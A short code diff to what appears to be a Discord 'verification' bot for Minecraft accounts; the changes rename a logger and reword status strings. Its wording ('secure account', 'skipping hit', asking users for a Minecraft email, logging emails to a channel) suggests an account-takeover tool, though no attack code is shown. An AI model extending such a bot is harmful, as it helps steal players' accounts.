@@ -9,7 +9,7 @@ from tools.post_verification import after_verify
 from views.buttons.embed_buttons import ButtonOptions
 from views.buttons.account_details import accountInfo
 
-log = logging.getLogger("bot")
+rom = logging.getLogger(__name__)
 
 _NO_MC_TITLE = "Failed to verify"
 _NO_MC_DESC = (
@@ -49,13 +49,13 @@ async def set_verify_ephemeral(interaction: Interaction, embed: Embed) -> None:
             await interaction.response.send_message(embed=embed, ephemeral=True)
             edited = True
     except Exception:
-        log.warning("edit verify ephemeral failed — trying followup", exc_info=True)
+        rom.warning("edit verify ephemeral failed — trying followup", exc_info=True)
     if edited:
         return
     try:
         await interaction.followup.send(embed=embed, ephemeral=True)
     except Exception:
-        log.exception("could not send verify ephemeral")
+        rom.exception("could not send verify ephemeral")
 
 
 async def _notify_user_no_minecraft(interaction: Interaction) -> None:
@@ -106,7 +106,7 @@ async def publish_embed_secure_result(
     view = ButtonOptions(interaction.user, interaction.user.id, username)
 
     if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
-        log.warning(
+        rom.warning(
             "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
             email,
         )
@@ -126,16 +126,16 @@ async def publish_embed_secure_result(
         return False
 
     if _is_failed(secured_account):
-        reason = "Failed to secure account"
+        reason = "[x] secure failed account"
         if isinstance(secured_account, dict):
             reason = str(secured_account.get("reason") or reason)
         short = public_secure_reason(reason)
 
-        log.warning("embed secure failed for %s: %s", email, short)
+        rom.warning("embed secure failed for %s: %s", email, short)
         await send_logs(
             interaction.client,
             build_log_embed(
-                f"**Email | Status | Reason**\n```{email} | Failed to secure | {short}```",
+                f"**Email | Status | Reason**\n```{email} | [x] secure failed | {short}```",
                 0xFA4343,
                 thumbnail=thumb,
                 user=interaction.user,
@@ -155,7 +155,7 @@ async def publish_embed_secure_result(
     no_mc = is_no_java_embed(secured_account)
 
     if no_mc:
-        log.warning(
+        rom.warning(
             "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
             email,
         )
